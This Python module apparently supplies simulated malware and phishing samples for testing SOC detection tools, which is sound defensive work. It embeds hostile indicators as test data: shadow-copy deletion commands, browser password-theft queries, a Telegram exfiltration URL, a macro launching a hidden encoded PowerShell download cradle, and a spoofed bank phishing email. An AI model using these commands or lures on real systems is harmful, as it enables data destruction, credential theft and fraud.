"""
Pre-Loaded Malware & Phishing Samples for SOC Testing and Demonstration.
Provides realistic sample payloads and emails to verify all static and dynamic modules immediately.
"""
from typing import Dict, Any, List

EICAR_PAYLOAD = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

WANNACRY_SIMULATED_PE = (
    b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'
    b'\xb8\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00'
    b'This program cannot be run in DOS mode.\r\r\n$'
    + (b'\x00' * 32)
    + b'PE\x00\x00L\x01\x04\x00\x94\xd5N^\x00\x00\x00\x00\x00\x00\x00\x00'
    b'tasksche.exe\x00Global\\MsWinZonesCacheCounterMutexA\x00'
    b'vssadmin.exe Delete Shadows /All /Quiet\x00'
    b'bcdedit /set {default} recoveryenabled No\x00'
    b'Ooops, your files have been encrypted!\x00'
    b'www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\x00'
    b'CryptEncrypt\x00CryptGenKey\x00VirtualAllocEx\x00WriteProcessMemory\x00'
    b'.WNCRY\x0013AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94\x00'
    b'WannaDecryptor.exe\x00cmd.exe /c start tasksche.exe\x00'
    + (b'\x90' * 500)
)

REDLINE_SIMULATED_PE = (
    b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'
    b'PE\x00\x00L\x01\x04\x00\x94\xd5N^\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\x00'
    b'SELECT action_url, username_value, password_value FROM logins\x00'
    b'\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\logins.json\x00'
    b'api.telegram.org/bot6184920491:AAHk19fJk3_SampleToken/sendDocument\x00'
    b'VirtualAlloc\x00RegQueryValueExA\x00InternetOpenA\x00'
    b'Wallets\\Ethereum\\keystore\x00'
    + (b'\xcc' * 400)
)

MALDOC_SIMULATED_CONTENT = (
    b'PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x00\x00\x00\x00'
    b'[Content_Types].xml\x00\x00\x00'
    b'word/vbaProject.bin\x00\x00'
    b'Sub AutoOpen()\n'
    b'    Dim wsh As Object\n'
    b'    Set wsh = CreateObject("WScript.Shell")\n'
    b'    wsh.Run "powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAE8AcABlAG4AUgBlAGEAZAAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAGQAbwBtAGEAaQBuAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAJwApAA=="\n'
    b'End Sub\n'
    + (b'\x00' * 200)
)

PHISHING_EML_SAMPLE = b"""Received: from mail-relay-04.attacker-infrastr.com (mail-relay-04.attacker-infrastr.com [185.192.68.42])
    by mx.yourcompany.com with ESMTP id m20si4928104qkz.12
    for <analyst@yourcompany.com>;
    Tue, 27 Oct 2026 15:32:10 -0400 (EDT)
Received: from localhost (unknown [194.26.29.110])
    by mail-relay-04.attacker-infrastr.com with SMTP id 9238410294;
    Tue, 27 Oct 2026 15:31:45 -0400 (EDT)
Authentication-Results: mx.yourcompany.com;
    spf=fail (sender IP 185.192.68.42 is not authorized by domain global-bank-support.com);
    dkim=fail header.d=attacker-infrastr.com;
    dmarc=fail (p=reject dis=none) header.from=global-bank-support.com
Received-SPF: fail (mx.yourcompany.com: domain of alert@global-bank-support.com does not designate 185.192.68.42 as permitted sender)
From: "Global Banking Security Team" <alert@global-bank-support.com>
To: <analyst@yourcompany.com>
Reply-To: security-recovery-team99@yandex.com
Return-Path: <bounces@spammer-redirect-node.ru>
Subject: URGENT: Immediate Action Required - Unauthorized Wire Transfer Suspended
Date: Tue, 27 Oct 2026 15:31:00 -0400
Message-ID: <20261027153100.9984.fake@global-bank-support.com>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="====BOUNDARY_SOC_TEST_998===="

--====BOUNDARY_SOC_TEST_998====
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: 7bit

<html>
<head><style>body{font-family:sans-serif;color:#222;}</style></head>
<body>
<div style="padding:20px;border:1px solid #ddd;border-radius:6px;max-width:600px;">
    <h2 style="color:#d93025;">Security Alert: Suspicious Transaction Flagged</h2>
    <p>Dear Valued Client,</p>
    <p>We detected an unauthorized international wire transfer of <strong>$14,850.00 USD</strong> initiated from an unrecognized device in Eastern Europe.</p>
    <p>Your online access has been temporarily restricted. You must verify your credentials within <strong>24 hours</strong> to prevent account forfeiture.</p>
    <p style="margin:25px 0;">
        <a href="http://login-verification-portal-update.ru/secure/auth" style="background:#0b57d0;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;font-weight:bold;">
            https://global-bank-support.com/verify-account
        </a>
    </p>
    <p style="font-size:12px;color:#777;">Please review the attached transaction confirmation statement for details.</p>
</div>
</body>
</html>

--====BOUNDARY_SOC_TEST_998====
Content-Type: application/octet-stream; name="Urgent_Wire_Statement_Invoice.exe"
Content-Disposition: attachment; filename="Urgent_Wire_Statement_Invoice.exe"
Content-Transfer-Encoding: base64

TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAmAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
RE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEFAAAAAAAAAAAAAAAA
--====BOUNDARY_SOC_TEST_998====--
"""

CLEAN_SAMPLE_PAYLOAD = (
    b'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'
    b'PE\x00\x00L\x01\x02\x00\x94\xd5N^\x00\x00\x00\x00\x00\x00\x00\x00'
    b'Vanguard Clean SOC Diagnostic Utility\x00'
    b'GetSystemInfo\x00GetTickCount\x00ExitProcess\x00MessageBoxA\x00'
    b'Hello SOC Analyst, this executable is completely clean and verified.\x00'
    + (b'\x00' * 500)
)

SAMPLES_CATALOG = [
    {
        "id": "sample-wannacry",
        "name": "WannaCry Ransomware Simulator",
        "filename": "WannaCry_v2.exe",
        "type": "file",
        "verdict": "Malicious",
        "description": "Simulates WannaCry ransomware: shadow copy deletion via vssadmin, .WNCRY file encryption, killswitch domain beacon, and ransom screen",
        "data": WANNACRY_SIMULATED_PE
    },
    {
        "id": "sample-redline",
        "name": "RedLine Infostealer Simulator",
        "filename": "RedLine_Stealer.exe",
        "type": "file",
        "verdict": "Malicious",
        "description": "Simulates RedLine infostealer: Chrome/Firefox SQLite credential harvesting, staging archive, and Telegram Bot C2 exfiltration",
        "data": REDLINE_SIMULATED_PE
    },
    {
        "id": "sample-maldoc",
        "name": "Malicious Macro Document",
        "filename": "Invoice_Q4_Overdue.docm",
        "type": "file",
        "verdict": "Malicious",
        "description": "Office OpenXML document with AutoOpen VBA macro spawning hidden obfuscated PowerShell download cradle",
        "data": MALDOC_SIMULATED_CONTENT
    },
    {
        "id": "sample-eicar",
        "name": "EICAR Standard AV Test",
        "filename": "eicar_com.com",
        "type": "file",
        "verdict": "Clean / Test",
        "description": "Official EICAR standard antivirus test string for validating multi-engine detection grids",
        "data": EICAR_PAYLOAD
    },
    {
        "id": "sample-phishing",
        "name": "CEO / Banking Spearphishing Email",
        "filename": "Urgent_Wire_Suspension.eml",
        "type": "email",
        "verdict": "Malicious / Phishing",
        "description": "Spearphishing email with SPF/DKIM/DMARC failure, display name spoofing, deceptive anchor link mismatch, and embedded executable attachment",
        "data": PHISHING_EML_SAMPLE
    },
    {
        "id": "sample-clean",
        "name": "Clean SOC Diagnostic Utility",
        "filename": "SOC_Diagnostic_Tool.exe",
        "type": "file",
        "verdict": "Clean",
        "description": "Verified benign binary demonstrating clean sandbox execution, 0/70 AV detections, and zero suspicious indicators",
        "data": CLEAN_SAMPLE_PAYLOAD
    }
]

def get_sample_by_id(sample_id: str) -> Dict[str, Any]:
    for s in SAMPLES_CATALOG:
        if s["id"] == sample_id:
            return s
    return None
